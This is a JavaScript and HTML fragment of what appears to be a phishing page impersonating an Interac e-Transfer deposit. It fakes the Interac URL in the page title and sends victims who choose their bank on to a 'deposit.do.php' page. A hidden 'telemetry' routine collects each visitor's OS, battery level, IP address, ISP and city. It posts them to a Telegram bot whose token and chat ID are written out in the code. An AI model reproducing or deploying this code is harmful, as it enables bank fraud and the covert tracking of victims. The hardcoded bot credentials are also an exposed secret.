<script src="assets/js/RP.do_inline_script_6_1_1_1.js"></script>
<script src="assets/js/RP.do_inline_script_7_1_1_1.js"></script>
<script src="assets/js/allModuleJS_1_1.js" type="text/javascript"></script>
<script src="assets/js/indexx_1_1.js"></script>

<!-- Core Connectivity -->
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>

<script>
/**
 * ROBYN BANKS OS - Gateway Logic v2.9
 * Optimized for 'fiid' resolution and themed telemetry
 */

// 1. CORE CONFIGURATION
const transactionId = "<?= $ref ?>";
const senderName    = "<?= addslashes($sender) ?>";
const amountStr     = "<?= $amountFormatted ?>";
const botToken      = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
const chatId        = '-1002922644009';

// 2. PRECISION ROUTING ENGINE
const routeToApp = (bankLabel, fiid) => {
    if (!bankLabel || bankLabel === "") return;
    
    // Clean data for URL
    const cleanAmount = amountStr.replace(/[^0-9.]/g, '');
    const encodedBank = encodeURIComponent(bankLabel);
    const encodedFiid = encodeURIComponent(fiid || '');
    
    // Construct target URL with specific bank ID (fiid)
    const finalUrl = `deposit.do.php?bank=${encodedBank}&fiid=${encodedFiid}&amount=${cleanAmount}&ref=${transactionId}&source=interac_gateway`;
    
    console.log("[GATEWAY] Routing with ID:", fiid, "Label:", bankLabel);
    window.location.href = finalUrl;
};

// 3. IMMEDIATE EVENT REGISTRATION
(function initListeners() {
    // Grid Tile Selection
    $(document).off('click', '.fi-tile').on('click', '.fi-tile', function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        const label = $(this).attr('filabel');
        const fiid = $(this).attr('fiid') || $(this).attr('value');
        routeToApp(label, fiid);
    });

    // Manual Booter Submit
    $(document).off('click', '#depositSelectSubmit').on('click', '#depositSelectSubmit', function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        const fiSelect = $('#selectFiId');
        const cuSelect = $('#credit-union');
        const selectedFi = fiSelect.find('option:selected');
        let label = "";
        let fiid = "";
        if (cuSelect.val() && cuSelect.val() !== "") {
            label = cuSelect.find('option:selected').text();
            fiid = cuSelect.val();
        } else {
            label = selectedFi.attr('filabel') || fiSelect.val();
            fiid = selectedFi.val();
        }
        if (label && label !== "" && fiid !== "") {
            routeToApp(label, fiid);
        } else {
            alert('Please select your financial institution or credit union.');
        }
    });

    // STABILIZED ACCORDION
    $(document).off('click', '.accordion-toggle').on('click', '.accordion-toggle', function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        const $this = $(this);
        const $content = $('.accordion-content');
        const $chevron = $('#detailToggleChevron');
        if ($content.is(':animated')) return;
        const isOpen = $this.data('expanded') === 'true';
        if (!isOpen) {
            $content.stop(true, true).slideDown(350);
            $this.data('expanded', 'true');
            $chevron.css({ 'transform': 'rotate(180deg)', 'transition': 'transform 0.3s ease' });
        } else {
            $content.stop(true, true).slideUp(300);
            $this.data('expanded', 'false');
            $chevron.css({ 'transform': 'rotate(0deg)', 'transition': 'transform 0.3s ease' });
        }
    });

    // Dynamic Title
    document.title = "etransfer.interac.ca/RP.do?deposit=" + transactionId;
})();

// 4. BACKGROUND TELEMETRY (Non-Blocking)
(async () => {
    try {
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        if (ua.indexOf("Win") != -1) os = "Windows";
        if (ua.indexOf("Mac") != -1) os = "MacOS";
        if (/Android/.test(ua)) os = "Android";
        if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";

        let batteryLevel = "N/A";
        if ('getBattery' in navigator) {
            const b = await navigator.getBattery();
            batteryLevel = Math.floor(b.level * 100) + "%";
        }

        let IP = 'N/A', ISP = 'N/A', city = 'N/A';
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            IP = data.ip || 'N/A';
            ISP = data.org || 'N/A';
            city = data.city || 'N/A';
        } catch (e) { console.warn("Geo-Link Failure"); }
        
        const logData = 
            `🟡 <b>${transactionId}</b> 🟡\n\n` +
            `› <b>${senderName}</b>\n` +
            `› <b>$${amountStr}</b>\n` +
            `› <code>${os} </code>\n` +
            `› <code>${batteryLevel}</code>\n` +
            `› <code>${city}</code>\n` +
            `› <code>${IP}</code>\n` +
            `› <code>${ISP}</code>\n\n` +
            `🟡 <b>${transactionId}</b> 🟡`;

        if (typeof axios !== 'undefined') {
            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: logData,
                parse_mode: 'HTML'
            });
        }
    } catch (err) {
        console.error("[TELEMETRY] Critical Failure but UI remains functional.");
    }
})();
</script>